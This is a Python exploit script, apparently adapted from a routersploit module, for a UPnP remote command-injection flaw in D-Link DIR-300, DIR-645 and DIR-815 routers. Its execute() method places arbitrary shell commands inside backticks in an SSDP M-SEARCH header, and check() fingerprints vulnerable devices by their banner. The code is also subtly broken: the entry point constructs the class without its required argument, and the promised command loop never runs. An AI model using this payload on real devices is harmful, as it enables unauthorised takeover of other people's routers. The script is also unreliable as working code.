target = ""
import socket

class Exploit:
    __info__ = {
        "name": "D-Link DIR-300 & DIR-645 & DIR-815 UPNP RCE",
        "description": "Module exploits D-Link DIR-300, DIR-645 and DIR-815 UPNP Remote Code Execution vulnerability which allows executing commands on the device.",
        "authors": (
            "Zachary Cutlip",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://github.com/zcutlip/exploit-poc/tree/master/dlink/dir-815-a1/upnp-command-injection",
            "http://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html",
            "https://www.exploit-db.com/exploits/34065/",
        ),
        "devices": (
            "D-Link DIR-300",
            "D-Link DIR-645",
            "D-Link DIR-815",
        )
    }

    def __init__(self, target):
        self.target = target
        self.port = 1900

    def run(self):
        if self.check():
            print("Target seems to be vulnerable")
            print("Invoking command loop...")
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        cmd = bytes(cmd, "utf-8")
        request = (
            b"M-SEARCH * HTTP/1.1\r\n" +
            b"Host:239.255.255.250:1900\r\n" +
            b"ST:uuid:`" + cmd + b"`\r\n" +
            b"Man:\"ssdp:discover\"\r\n" +
            b"MX:2\r\n\r\n"
        )

        udp_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_client.sendto(request, ("239.255.255.250", self.port))
        udp_client.close()

    def check(self):
        request = (
            b"M-SEARCH * HTTP/1.1\r\n"
            b"Host:239.255.255.250:1900\r\n"
            b"ST:upnp:rootdevice\r\n"
            b"Man:\"ssdp:discover\"\r\n"
            b"MX:2\r\n\r\n"
        )

        udp_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_client.sendto(request, ("239.255.255.250", self.port))
        response, _ = udp_client.recvfrom(65535)
        udp_client.close()

        if response and b"Linux, UPnP/1.0, DIR-" in response:
            return True
        return False




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
